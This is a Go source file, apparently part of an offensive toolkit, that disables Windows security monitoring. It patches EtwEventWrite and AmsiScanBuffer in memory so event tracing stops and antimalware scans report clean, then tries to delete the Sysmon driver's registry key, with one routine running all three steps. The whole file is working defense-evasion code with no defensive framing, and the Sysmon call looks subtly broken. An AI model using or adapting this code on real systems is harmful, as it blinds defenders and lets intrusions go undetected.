package kernelevasion

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ETW (Event Tracing for Windows) Bypass
func bypassETW() {
	fmt.Println("[+] Disabling ETW logging...")

	ntdll := syscall.NewLazyDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")

	// Overwrite EtwEventWrite function with a stub (returning 0)
	stub := []byte{0xC3} // RET instruction
	oldProtect := windows.PAGE_EXECUTE_READWRITE
	var oldProtectBackup uint32

	addr := uintptr(etwEventWrite.Addr())
	windows.VirtualProtect(addr, uintptr(len(stub)), oldProtect, &oldProtectBackup)
	copy((*[1]byte)(unsafe.Pointer(addr))[:], stub)
	windows.VirtualProtect(addr, uintptr(len(stub)), oldProtectBackup, &oldProtectBackup)

	fmt.Println("[+] ETW Bypass applied!")
}

// AMSI (Antimalware Scan Interface) Bypass
func bypassAMSI() {
	fmt.Println("[+] Disabling AMSI scanning...")

	amsiDll := syscall.NewLazyDLL("amsi.dll")
	amsiScanProc := amsiDll.NewProc("AmsiScanBuffer")

	// Patch AMSI function to always return a clean result
	stub := []byte{0x31, 0xC0, 0xC3} // XOR EAX, EAX; RET
	oldProtect := windows.PAGE_EXECUTE_READWRITE
	var oldProtectBackup uint32

	addr := uintptr(amsiScanProc.Addr())
	windows.VirtualProtect(addr, uintptr(len(stub)), oldProtect, &oldProtectBackup)
	copy((*[3]byte)(unsafe.Pointer(addr))[:], stub)
	windows.VirtualProtect(addr, uintptr(len(stub)), oldProtectBackup, &oldProtectBackup)

	fmt.Println("[+] AMSI Bypass applied!")
}

// Sysmon Evasion (Disabling Logging)
func disableSysmon() {
	fmt.Println("[+] Attempting Sysmon evasion...")

	sysmonProc := syscall.NewLazyDLL("advapi32.dll").NewProc("RegDeleteKeyA")
	keyPath, _ := syscall.UTF16PtrFromString(`SYSTEM\CurrentControlSet\Services\SysmonDrv`)

	// Delete Sysmon registry key
	ret, _, _ := sysmonProc.Call(uintptr(unsafe.Pointer(keyPath)))
	if ret == 0 {
		fmt.Println("[+] Sysmon disabled successfully!")
	} else {
		fmt.Println("[!] Sysmon removal failed.")
	}
}

// Execute all bypasses
func EvasionRoutine() {
	bypassETW()
	bypassAMSI()
	disableSysmon()
}
